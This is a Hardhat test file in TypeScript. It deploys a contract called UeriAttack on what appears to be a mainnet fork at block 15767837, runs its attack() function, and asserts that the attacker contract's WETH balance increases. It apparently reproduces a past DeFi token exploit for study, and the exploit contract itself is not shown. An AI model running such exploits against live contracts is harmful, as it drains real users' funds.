import { ethers } from 'hardhat'
import { expect } from 'chai'
import { IERC20, UeriAttack } from '../typechain-types'

describe('AttackContract Test', function () {
    this.timeout(150000)
    let attackerContract: UeriAttack
    let WETH_TOKEN: IERC20
    let deployerSigner: any

    before(async function () {
        // Get the deployer's signer object
        ;[deployerSigner] = await ethers.getSigners()

        // Deploy the attacker contract
        const AttackerContract = await ethers.getContractFactory('UeriAttack')
        attackerContract = await AttackerContract.deploy()
    })

    it('should block number equal to 15767837', async function () {
        const blockNumber = await ethers.provider.getBlockNumber()
        expect(blockNumber).to.equal(15767837)
    })

    it('Should perform the attack', async function () {
        // Get the balance of WETH for the attacker contract
        WETH_TOKEN = await ethers.getContractAt('IERC20', '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2')

        const balanceBeforeAttack = await WETH_TOKEN.balanceOf(attackerContract.getAddress())
        console.log('Attacker WETH balance before attack:', ethers.formatEther(balanceBeforeAttack))

        // Execute the attack
        const tx = await attackerContract.connect(deployerSigner).attack()
        await tx.wait()

        const balanceAfterAttack = await WETH_TOKEN.balanceOf(attackerContract.getAddress())
        console.log('Attacker WETH balance after attack:', ethers.formatEther(balanceAfterAttack))

        // Check if the balance after the attack has increased (this line is optional, depends on your test requirements)
        expect(balanceAfterAttack).to.be.gt(balanceBeforeAttack)
    })
})
